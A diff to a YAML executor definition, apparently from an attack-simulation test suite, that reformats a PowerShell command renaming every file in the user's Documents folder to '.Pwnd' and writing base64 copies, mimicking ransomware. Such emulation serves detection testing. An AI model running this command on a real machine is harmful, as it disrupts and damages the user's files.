@@ -2,16 +2,15 @@
   executors:
   - cleanup: []
     command: '
-$TargetFolder="$($env:USERPROFILE)\Documents";
-foreach($f in Get-ChildItem $TargetFolder) {
-    Get-Content -Path $f.fullname -TotalCount 1;
-    Rename-Item -Path $f.fullname -NewName ($f.fullname + ".Pwnd");
-    #[IO.File]::WriteAllBytes(($f.fullname + ".Pwnd"),([System.Convert]::ToBase64String([IO.File]::ReadAllBytes($f.fullname +".Pwnd"))));
-    $bytes = [IO.file]::ReadAllBytes($f.FullName+".Pwnd");
-    $b64converted = [System.convert]::ToBase64String($bytes);
-    [IO.file]::WriteAllText($f.FullName+"Pwnd", $b64converted);
-    }
-      '
+        $TargetFolder="$($env:USERPROFILE)\Documents";
+        foreach($f in Get-ChildItem $TargetFolder) {
+            Get-Content -Path $f.fullname -TotalCount 1;
+            Rename-Item -Path $f.fullname -NewName ($f.fullname + ".Pwnd");
+            $bytes = [IO.file]::ReadAllBytes($f.FullName+".Pwnd");
+            $b64converted = [System.convert]::ToBase64String($bytes);
+            [IO.file]::WriteAllText($f.FullName+"Pwnd", $b64converted);
+        }
+        '
     code: null
     build_target: null
     timeout: 10
